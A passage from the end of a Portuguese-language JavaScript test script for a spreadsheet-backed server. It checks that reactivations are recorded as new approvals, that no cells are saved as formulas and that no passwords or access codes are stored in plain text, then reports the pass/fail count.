T("a reativação conta como nova aprovação (quem e quando)", davi()[11] === "Rita RT" && new Date(davi()[12]) >= new Date(davi()[10]), davi());

/* ---------------------------------------------------------------- geral */
parte("geral");
T("nenhuma célula gravada como fórmula em todo o teste", G.est.formulas.length === 0, G.est.formulas.slice(0, 5));
T("nenhuma senha ou código de acesso gravado em texto na planilha", !JSON.stringify(G.est.sheets).includes(S.SENHA_TITULAR) && !JSON.stringify(G.est.sheets).includes(ANA.codigo));

console.log(falhas ? `\n${falhas} de ${total} verificações FALHARAM.` : `\nTudo certo: ${total} verificações do servidor passaram.`);
process.exit(falhas ? 1 : 0);
